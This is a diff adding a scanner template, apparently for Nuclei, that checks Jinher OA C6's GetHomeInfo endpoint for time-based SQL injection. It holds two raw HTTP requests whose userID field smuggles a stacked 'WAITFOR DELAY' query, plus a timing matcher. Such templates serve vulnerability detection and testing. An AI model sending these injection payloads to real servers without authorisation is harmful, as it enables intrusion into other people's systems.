@@ -1,0 +1,23 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_2 > duration_1 && contains_all(body,'?xm','Sex','ToRead')
+          type: dsl
+      raw:
+        - |
+          GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:0%27-- HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:2%27-- HTTP/1.1
+          Host: {{Hostname}}
+id: jinher-c6-homeservice-sqli
+info:
+    author: SleepingBag945
+    name: 金和OA C6 GetHomeInfo SQL注入
+    severity: high
+    tags:
+        - LEAP
+        - Eserv
+        - 金和oa
+        - eserv
